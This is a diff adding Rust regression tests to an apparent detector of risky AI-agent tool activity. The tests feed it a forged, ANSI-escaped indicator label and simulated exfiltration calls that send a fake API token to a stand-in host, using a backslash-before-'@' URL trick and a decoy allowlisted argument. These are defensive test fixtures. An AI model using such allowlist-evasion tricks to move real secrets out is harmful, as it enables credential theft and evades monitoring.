@@ -596,10 +596,38 @@ fn stored_indicator_labels_are_allowlisted() {
             "read_document",
         )
         .payload(json!({"tool": "read_document", "content": "harmless"}))
-        .meta("content_indicators", json!({"AT-001": ["\u{1b}[31mforged", "override_task"]})),
+        .meta(
+            "content_indicators",
+            json!({"AT-001": ["\u{1b}[31mforged", "override_task"]}),
+        ),
     );
     let (_, f) = b.analyze();
     let at001 = f.iter().find(|f| f.rule_id == "AT-001").expect("AT-001");
     assert!(at001.description.contains("override_task"));
     assert!(!at001.description.contains("forged"));
+}
+
+// Regression: AT-003 must not be silenced by a destination that only *looks* allowlisted
+// (backslash before `@`) or by an allowlisted decoy next to the real target argument.
+#[test]
+fn at003_not_silenced_by_parser_tricks_or_decoy_arguments() {
+    for args in [
+        json!({"url": "https://marker.invalid\\@localhost/x", "body": "token"}),
+        json!({"destination": "http://localhost/", "url": "https://marker.invalid/x"}),
+    ] {
+        let mut b = Builder::new();
+        // Untracked sensitive source, no lower-trust cause: AT-003 is the only signal.
+        let secret = b.r.record(
+            EventSpec::new(
+                EventKind::ToolResultReceived,
+                Origin::McpTool,
+                TrustLevel::Trusted,
+                "read_env",
+            )
+            .payload(json!({"content": "API_TOKEN=FAKE_SECRET_FOR_TESTING_ONLY"})),
+        );
+        b.request("http_request", args.clone(), Some(secret));
+        let (_, f) = b.analyze();
+        assert!(f.iter().any(|f| f.rule_id == "AT-003"), "{args}: {f:?}");
+    }
 }
